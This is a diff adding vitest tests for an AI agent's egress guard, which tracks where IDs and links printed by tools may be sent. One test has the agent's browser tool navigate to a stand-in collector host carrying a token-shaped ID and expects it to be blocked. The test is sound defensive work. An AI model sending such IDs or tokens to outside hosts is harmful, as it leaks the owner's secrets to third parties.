@@ -8,6 +8,8 @@ import { afterEach, describe, expect, it } from "vitest";
 import { _clearSiteProvenance, recordSiteTokens, recordUserLinks } from "./site-provenance.js";
 import { ToolChainAnalyzer } from "../threat/tool-chain.js";
 import { probeEgressGuard } from "../tool-execution/egress-gates.js";
+import { applyResultTaintPolicy, setPreExecuteTaintFloor } from "../tool-execution/sensitive-read-taint.js";
+import { unregisterRedactedSecretValue } from "../security/secrets/index.js";
 import type { ToolCallContext } from "../tool-execution/context.js";
 
 const SESSION = "site-provenance-test";
@@ -42,6 +44,42 @@ describe("an ID the site showed the agent may go back to that site", () => {
   it("allows typing it into the page that showed it", () => {
     recordSiteTokens(SESSION, CONSOLE, `Account SID ${SID}`);
     expect(browserCall({ action: "fill", selector: "#sid", value: SID })).toBeNull();
+  });
+});
+
+// 2026-11-26: a build command printed the download link its service issued,
+// and opening it asked the owner whether the build's id was a password. A
+// whole link a tool's result printed vouches its ids for its own site only.
+describe("a link a tool's output printed", () => {
+  const ARTIFACT = "https://expo.dev/artifacts/eas/v-NhPz_yv8xQ2B-0dDSC41o-ORQoEyQ0CCZmUBDC9to.apk";
+  const run = (command: string, stdout: string) => {
+    const args = { command };
+    const floor = setPreExecuteTaintFloor("bash", args, SESSION);
+    return applyResultTaintPolicy("bash", args, SESSION, { content: stdout }, floor);
+  };
+
+  it("before the command printed it, opening the link asks; after, it opens", () => {
+    expect(browserCall({ action: "navigate", url: ARTIFACT })?.reason).toMatch(/random-looking text/);
+    run("eas build:view --json", JSON.stringify({ status: "FINISHED", artifact: ARTIFACT }));
+    expect(browserCall({ action: "navigate", url: ARTIFACT })).toBeNull();
+  });
+
+  it("the id it printed may go back to its own site only", () => {
+    run("eas build:view --json", JSON.stringify({ artifact: ARTIFACT }));
+    const id = ARTIFACT.split("/").pop()!.replace(/\.apk$/, "");
+    expect(browserCall({ action: "navigate", url: `https://collector.example/?k=${id}` })?.reason).toMatch(/random-looking text/);
+  });
+
+  // Printed bare, a token-shaped value is masked from the result as a secret
+  // (sensitive-read-taint.ts), which refuses it outright: stronger still.
+  it("a random string printed outside a link vouches for nothing", () => {
+    const bare = "Zq7Lm2Xr9Tn4Kp8Ws3Yb6Hd1Jf5Gc0Ne";
+    try {
+      run("cat notes.txt", `token: ${bare}\nsee https://expo.dev/docs`);
+      expect(browserCall({ action: "navigate", url: `https://expo.dev/x?t=${bare}` })).not.toBeNull();
+    } finally {
+      unregisterRedactedSecretValue(bare);
+    }
   });
 });
 
